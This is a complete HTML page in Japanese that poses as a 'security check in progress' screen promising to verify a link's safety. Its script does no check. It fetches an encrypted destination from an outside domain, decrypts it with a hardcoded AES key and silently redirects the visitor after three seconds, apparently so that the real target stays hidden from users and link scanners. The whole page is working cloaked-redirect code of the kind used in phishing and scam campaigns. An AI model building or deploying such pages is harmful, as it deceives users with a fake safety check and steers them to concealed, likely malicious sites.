<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>セキュリティ確認中...</title>
  <meta name="robots" content="noindex,nofollow">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      text-align: center;
      font-family: "Segoe UI", "Hiragino Kaku Gothic ProN", sans-serif;
      padding-top: 80px;
      background-color: #f9f9f9;
    }
    .loader {
      margin: 30px auto;
      border: 6px solid #f3f3f3;
      border-top: 6px solid #3498db;
      border-radius: 50%;
      width: 50px; height: 50px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin { 0% {transform: rotate(0);} 100% {transform: rotate(360deg);} }
    .caption { color: #666; font-size: 13px; margin-top: 10px; }
  </style>
</head>
<body>
  <h2>セキュリティ確認中...</h2>
  <p>リンクの安全性を確認しています。まもなくページが表示されます。</p>
  <div class="loader"></div>
  <p class="caption">セキュア認証サービス</p>

  <script>
    const AES_KEY = "5Ctianyoumabiiii"; // 16字节
    const id = location.pathname.split("/").pop();

    if (!id) {
      document.body.innerHTML = "<h3>無効なIDです</h3>";
    } else {
      fetch("https://ghwrweh.top/api/jumpSite?siteName=" + encodeURIComponent(id))
        .then(r => r.json())
        .then(data => {
          const enc = data?.data?.siteUrl;
          if (enc) {
            decryptAES(enc).then(realUrl => {
              if (realUrl) {
                setTimeout(() => location.href = realUrl, 3000);
              } else {
                document.body.innerHTML += "<p>リダイレクト先の復号に失敗しました。</p>";
              }
            });
          } else {
            document.body.innerHTML += "<p>リダイレクト先が見つかりません。</p>";
          }
        }).catch(() => {
          document.body.innerHTML += "<p>エラーが発生しました。</p>";
        });
    }

    async function decryptAES(encText) {
      try {
        const base64 = encText.replace(/-/g, '+').replace(/_/g, '/');
        const bytes = Uint8Array.from(atob(base64), c => c.charCodeAt(0));
        const iv = bytes.slice(0, 16);
        const data = bytes.slice(16);
        const key = await crypto.subtle.importKey(
          "raw",
          new TextEncoder().encode(AES_KEY),
          { name: "AES-CBC" },
          false,
          ["decrypt"]
        );
        const decrypted = await crypto.subtle.decrypt(
          { name: "AES-CBC", iv },
          key,
          data
        );
        return new TextDecoder().decode(decrypted).replace(/\u0000+$/, '');
      } catch (_) {
        return null;
      }
    }
  </script>
</body>
</html>
